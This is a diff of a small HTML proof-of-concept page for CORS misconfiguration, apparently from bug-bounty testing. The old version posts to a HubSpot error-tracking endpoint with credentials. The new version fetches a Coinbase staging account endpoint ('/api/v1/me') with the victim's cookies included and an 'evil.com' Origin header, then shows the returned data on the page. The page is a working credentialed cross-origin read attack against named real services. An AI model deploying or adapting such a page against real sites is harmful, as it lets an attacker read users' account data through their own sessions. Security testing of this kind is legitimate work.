@@ -1,31 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit PoC</title>
+  <title>Coinbase CORS Test</title>
 </head>
 <body>
-  <h1>Loading attack...</h1>
+  <h2>CORS PoC: https://accounts-staging.cbhq.net/api/v1/me</h2>
+  <pre id="result">Testing...</pre>
+
   <script>
-    fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=notifications", {
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
+    fetch("https://accounts-staging.cbhq.net/api/v1/me", {
+      method: "GET",
+      credentials: "include", // cookie'yi tarayıcıdan ekler
       headers: {
-        "Content-Type": "text/plain;charset=UTF-8"
-      },
-      body: JSON.stringify({
-        "message": "If this reaches HubSpot with victim's cookies, CORS is vulnerable.",
-        "level": "info"
-      })
-    })
-    .then(res => {
-      if (res.ok) {
-        alert("CORS with credentials: possible data exfil!");
-      } else {
-        alert("Request failed or blocked.");
+        "Origin": "https://evil.com"
       }
     })
-    .catch(err => console.error("Error:", err));
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById("result").textContent = "Success:\n" + data;
+      console.log("✅ Response:", data);
+    })
+    .catch(err => {
+      document.getElementById("result").textContent = "Error:\n" + err;
+      console.error("❌ Error:", err);
+    });
   </script>
 </body>
 </html>
